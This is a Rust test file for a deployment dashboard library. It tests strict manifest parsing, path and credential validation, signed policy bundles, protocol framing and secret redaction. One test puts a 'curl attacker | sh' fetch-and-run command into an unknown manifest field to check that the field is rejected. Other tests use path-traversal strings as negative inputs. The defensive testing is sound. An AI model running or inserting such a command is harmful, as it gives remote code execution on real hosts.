use std::{collections::BTreeMap, str::FromStr};

use ed25519_dalek::SigningKey;
use proptest::prelude::*;
use rdashboard::{
    domain::{
        AbsolutePolicyPath, BlockingReason, BuildContext, BuildKind, BuildPolicy, CanonicalBranch,
        CiPolicy, DataClass, DataVolumePolicy, DiskReservation, DiskReservationError,
        EvidenceDigest, GIB, GitCommitId, HealthCheckPolicy, HttpEndpoint, ManifestError,
        MigrationEntrypoint, MigrationPolicy, NotificationPolicy, NotificationRoute,
        OperationPhase, OperationResult, OperationState, OperationStateError,
        PROJECT_MANIFEST_SCHEMA_VERSION, ProjectId, ProjectManifestV1, Redactor,
        RelativePolicyPath, ReleaseClass, RemoteUrl, Retryability, RollbackPolicy, SourcePolicy,
        StructuredError, WriteFencePolicy,
    },
    policy::{PolicyBundleV1, PolicyError, PolicyVerifier, SignedPolicyBundleV1},
    protocol::{
        CONTROL_PROTOCOL_VERSION, ControlRequestEnvelope, FrameError, NORMAL_FRAME_MAX_BYTES,
        decode_single_frame, encode_frame,
    },
};
use serde_json::json;
use uuid::Uuid;

fn valid_manifest() -> ProjectManifestV1 {
    ProjectManifestV1 {
        schema_version: PROJECT_MANIFEST_SCHEMA_VERSION,
        project_id: ProjectId::from_str("rimg").unwrap_or_else(|error| panic!("fixture: {error}")),
        display_name: "rimg".to_owned(),
        source: SourcePolicy {
            remote_url: RemoteUrl::from_str("https://github.com/example/rimg.git")
                .unwrap_or_else(|error| panic!("fixture: {error}")),
            branch: CanonicalBranch::Main,
        },
        ci: CiPolicy::BinCi,
        build: BuildPolicy {
            context: BuildContext::RepositoryRoot,
            kind: BuildKind::Oci,
            dockerfile: Some(
                RelativePolicyPath::from_str("Dockerfile")
                    .unwrap_or_else(|error| panic!("fixture: {error}")),
            ),
        },
        health_checks: vec![HealthCheckPolicy {
            name: "readiness".to_owned(),
            endpoint: HttpEndpoint::from_str("http://rimg:3000/health/ready")
                .unwrap_or_else(|error| panic!("fixture: {error}")),
            expected_status: 200,
            timeout_seconds: 5,
        }],
        data_volumes: vec![DataVolumePolicy {
            path: AbsolutePolicyPath::from_str("/var/lib/rimg/data")
                .unwrap_or_else(|error| panic!("fixture: {error}")),
            class: DataClass::Stateful,
            backup_required: true,
        }],
        migration: MigrationPolicy {
            entrypoint: MigrationEntrypoint::ApplicationMigrate,
            write_fence: WriteFencePolicy::ApplicationProtocolV1,
        },
        rollback: RollbackPolicy {
            code_rollback: true,
            soak_seconds: 120,
        },
        notifications: NotificationPolicy {
            route: NotificationRoute::TelegramDefault,
            maintenance_suppression: true,
        },
    }
}

#[test]
fn manifest_round_trip_is_strict_and_validated() {
    let manifest = valid_manifest();
    manifest
        .validate()
        .unwrap_or_else(|error| panic!("valid manifest: {error}"));
    let encoded = serde_json::to_string(&manifest)
        .unwrap_or_else(|error| panic!("serialize manifest: {error}"));
    let decoded: ProjectManifestV1 = serde_json::from_str(&encoded)
        .unwrap_or_else(|error| panic!("deserialize manifest: {error}"));
    assert_eq!(decoded, manifest);

    let mut unknown =
        serde_json::to_value(&manifest).unwrap_or_else(|error| panic!("manifest value: {error}"));
    unknown["repository_command"] = json!("curl attacker | sh");
    assert!(serde_json::from_value::<ProjectManifestV1>(unknown).is_err());
}

#[test]
fn manifest_rejects_traversal_embedded_credentials_and_duplicates() {
    assert!(RelativePolicyPath::from_str("../Dockerfile").is_err());
    assert!(AbsolutePolicyPath::from_str("/var/lib/../etc").is_err());
    assert!(RemoteUrl::from_str("https://user:secret@example.com/repo.git").is_err());
    assert!(RemoteUrl::from_str("https://token@example.com/repo.git").is_err());
    assert!(RemoteUrl::from_str("https://example.com").is_err());
    assert!(HttpEndpoint::from_str("http://user:secret@service/health").is_err());
    assert!(AbsolutePolicyPath::from_str("/var//lib/rdashboard").is_err());

    let mut manifest = valid_manifest();
    manifest
        .health_checks
        .push(manifest.health_checks[0].clone());
    assert!(matches!(
        manifest.validate(),
        Err(ManifestError::DuplicateHealthCheck(_))
    ));

    let mut manifest = valid_manifest();
    manifest.data_volumes[0].path = AbsolutePolicyPath::from_str("/")
        .unwrap_or_else(|error| panic!("root path fixture: {error}"));
    assert!(matches!(
        manifest.validate(),
        Err(ManifestError::UnsafeDataPath(_))
    ));

    let mut manifest = valid_manifest();
    manifest.build.dockerfile = Some(
        RelativePolicyPath::from_str("NotDockerfile")
            .unwrap_or_else(|error| panic!("Dockerfile fixture: {error}")),
    );
    assert_eq!(
        manifest.validate(),
        Err(ManifestError::InvalidDockerfilePath)
    );

    let mut manifest = valid_manifest();
    manifest.build.dockerfile = Some(
        RelativePolicyPath::from_str("Dockerfile.runtime")
            .unwrap_or_else(|error| panic!("variant Dockerfile fixture: {error}")),
    );
    manifest
        .validate()
        .unwrap_or_else(|error| panic!("conventional Dockerfile variant: {error}"));
}

#[test]
fn release_tables_enforce_order_and_mutation_recovery() {
    assert!(
        ReleaseClass::CodeOnlyCompatible
            .permits_transition(OperationPhase::Building, OperationPhase::Preflight)
    );
    assert!(
        !ReleaseClass::CodeOnlyCompatible
            .permits_transition(OperationPhase::Preflight, OperationPhase::Migrating)
    );
    assert!(
        ReleaseClass::StatefulCompatible
            .permits_transition(OperationPhase::BackingUp, OperationPhase::Draining,)
    );
    assert!(ReleaseClass::StatefulCompatible.permits_transition(
        OperationPhase::Draining,
        OperationPhase::CutoverSnapshotting,
    ));
    assert!(OperationPhase::Draining.crosses_mutation_boundary());
    assert!(ReleaseClass::StatefulCompatible.permits_transition(
        OperationPhase::CutoverSnapshotting,
        OperationPhase::Migrating,
    ));
    assert!(!ReleaseClass::StatefulCompatible.permits_transition(
        OperationPhase::BackingUp,
        OperationPhase::CutoverSnapshotting
    ));
    assert!(
        ReleaseClass::StatefulBreaking
            .permits_transition(OperationPhase::Deploying, OperationPhase::Reconciliation)
    );
    assert!(
        !ReleaseClass::StatefulBreaking
            .permits_transition(OperationPhase::Testing, OperationPhase::Rollback)
    );
}

#[test]
fn orthogonal_operation_state_rejects_impossible_combinations() {
    let terminal_blocked = OperationState {
        phase: OperationPhase::Preflight,
        result: OperationResult::Failed,
        blocking_reason: BlockingReason::DiskReserve,
    };
    assert_eq!(
        terminal_blocked.validate(),
        Err(OperationStateError::TerminalOperationBlocked)
    );

    let misplaced_recovery = OperationState {
        phase: OperationPhase::Deploying,
        result: OperationResult::ManualRecoveryRequired,
        blocking_reason: BlockingReason::None,
    };
    assert_eq!(
        misplaced_recovery.validate(),
        Err(OperationStateError::ManualRecoveryOutsideReconciliation)
    );
}

#[test]
fn every_blocker_has_explicit_retryability_except_none() {
    let blockers = [
        BlockingReason::DiskReserve,
        BlockingReason::SourceDivergence,
        BlockingReason::SourceBrokerUnavailable,
        BlockingReason::SourceHeadSuperseded,
        BlockingReason::SourceAttestationInvalid,
        BlockingReason::PolicyUnavailable,
        BlockingReason::PolicyInvalid,
        BlockingReason::PolicyStale,
        BlockingReason::SecurityStateInvalid,
        BlockingReason::BackupPolicy,
        BlockingReason::StaleTelemetry,
        BlockingReason::ClockUnsynchronized,
        BlockingReason::MaintenanceConflict,
        BlockingReason::OperatorHold,
    ];
    assert!(
        blockers
            .into_iter()
            .all(|blocker| blocker.retryability().is_some())
    );
    assert_eq!(BlockingReason::None.retryability(), None);
}

#[test]
fn disk_reservation_preserves_the_emergency_floor() {
    let reservation = DiskReservation {
        filesystem_identity: EvidenceDigest::sha256("domain test filesystem"),
        filesystem_total_bytes: 100 * GIB,
        filesystem_available_bytes: 20 * GIB,
        observed_at_ms: 1_700_000_000_000,
        backup_staging_bytes: GIB,
        build_peak_bytes: GIB,
        registry_peak_bytes: GIB,
        last_known_good_bytes: GIB,
        projected_hot_store_growth_bytes: GIB,
    };
    assert_eq!(reservation.emergency_reserve_bytes(), 15 * GIB);
    reservation
        .evaluate()
        .unwrap_or_else(|error| panic!("reservation should fit exactly: {error}"));

    let insufficient = DiskReservation {
        filesystem_available_bytes: 20 * GIB - 1,
        ..reservation
    };
    assert!(matches!(
        insufficient.evaluate(),
        Err(DiskReservationError::InsufficientSpace { deficit: 1, .. })
    ));
}

#[test]
fn signed_policy_rejects_tampering_unknown_keys_and_rollback() {
    let signing_key = SigningKey::from_bytes(&[7_u8; 32]);
    let bundle = PolicyBundleV1 {
        schema_version: 1,
        policy_version: 4,
        issued_at_ms: 1_700_000_000_000,
        projects: vec![valid_manifest()],
    };
    let signed = SignedPolicyBundleV1::sign("offline-2026", bundle, &signing_key)
        .unwrap_or_else(|error| panic!("sign policy: {error}"));
    let verifier = PolicyVerifier::new(
        BTreeMap::from([("offline-2026".to_owned(), signing_key.verifying_key())]),
        4,
    )
    .unwrap_or_else(|error| panic!("verifier: {error}"));
    verifier
        .verify(&signed)
        .unwrap_or_else(|error| panic!("verify policy: {error}"));

    let mut tampered = signed.clone();
    tampered.payload.projects[0].display_name = "tampered".to_owned();
    assert!(matches!(
        verifier.verify(&tampered),
        Err(PolicyError::SignatureVerification(_))
    ));

    let rollback_verifier = PolicyVerifier::new(
        BTreeMap::from([("offline-2026".to_owned(), signing_key.verifying_key())]),
        5,
    )
    .unwrap_or_else(|error| panic!("verifier: {error}"));
    assert!(matches!(
        rollback_verifier.verify(&signed),
        Err(PolicyError::PolicyRollback { .. })
    ));
}

#[test]
fn framed_protocol_rejects_unknown_duplicate_trailing_and_oversized_input() {
    let request_id = Uuid::new_v4();
    let json = format!(
        r#"{{"version":{CONTROL_PROTOCOL_VERSION},"request_id":"{request_id}","request":{{"operation":"observe_host_snapshot"}}}}"#
    );
    let json_length =
        u32::try_from(json.len()).unwrap_or_else(|error| panic!("fixture length: {error}"));
    let mut frame = Vec::from(json_length.to_be_bytes());
    frame.extend_from_slice(json.as_bytes());
    let decoded: ControlRequestEnvelope = decode_single_frame(&frame, NORMAL_FRAME_MAX_BYTES)
        .unwrap_or_else(|error| panic!("decode valid frame: {error}"));
    decoded
        .validate()
        .unwrap_or_else(|error| panic!("validate request: {error}"));

    let duplicate = format!(
        r#"{{"version":{CONTROL_PROTOCOL_VERSION},"version":{CONTROL_PROTOCOL_VERSION},"request_id":"{request_id}","request":{{"operation":"observe_host_snapshot"}}}}"#
    );
    let duplicate_length =
        u32::try_from(duplicate.len()).unwrap_or_else(|error| panic!("fixture length: {error}"));
    let mut duplicate_frame = Vec::from(duplicate_length.to_be_bytes());
    duplicate_frame.extend_from_slice(duplicate.as_bytes());
    assert!(matches!(
        decode_single_frame::<ControlRequestEnvelope>(&duplicate_frame, NORMAL_FRAME_MAX_BYTES),
        Err(FrameError::Json(_))
    ));

    let mut trailing = frame.clone();
    trailing.push(0);
    assert!(matches!(
        decode_single_frame::<ControlRequestEnvelope>(&trailing, NORMAL_FRAME_MAX_BYTES),
        Err(FrameError::TrailingBytes(1))
    ));

    let huge = vec![b'x'; NORMAL_FRAME_MAX_BYTES + 1];
    assert!(matches!(
        encode_frame(&huge, NORMAL_FRAME_MAX_BYTES),
        Err(FrameError::Oversized { .. })
    ));
}

#[test]
fn failure_capsule_redacts_before_enforcing_the_cap() {
    let redactor = Redactor::new(["known-production-secret"])
        .unwrap_or_else(|error| panic!("redactor: {error}"));
    let capsule = rdashboard::domain::FailureCapsule::from_raw(
        "ci",
        StructuredError {
            code: "ci_failed".to_owned(),
            summary: "CI failed".to_owned(),
            retryability: Retryability::OperatorRunbook,
            runbook_id: None,
        },
        &format!(
            "token=sensitive-value {}",
            "known-production-secret".repeat(10_000)
        ),
        &redactor,
    );
    assert!(!capsule.excerpt.contains("sensitive-value"));
    assert!(!capsule.excerpt.contains("known-production-secret"));
    assert!(capsule.excerpt.len() <= 64 * 1024);
}

proptest! {
    #[test]
    fn arbitrary_frames_never_panic(bytes in proptest::collection::vec(any::<u8>(), 0..80_000)) {
        let _result = decode_single_frame::<ControlRequestEnvelope>(&bytes, NORMAL_FRAME_MAX_BYTES);
    }
}

#[test]
fn identifier_contracts_require_canonical_values() {
    assert!(ProjectId::from_str("telegram-gateway").is_ok());
    assert!(ProjectId::from_str("Telegram_Gateway").is_err());
    assert!(GitCommitId::from_str(&"a".repeat(40)).is_ok());
    assert!(GitCommitId::from_str(&"A".repeat(40)).is_err());
}
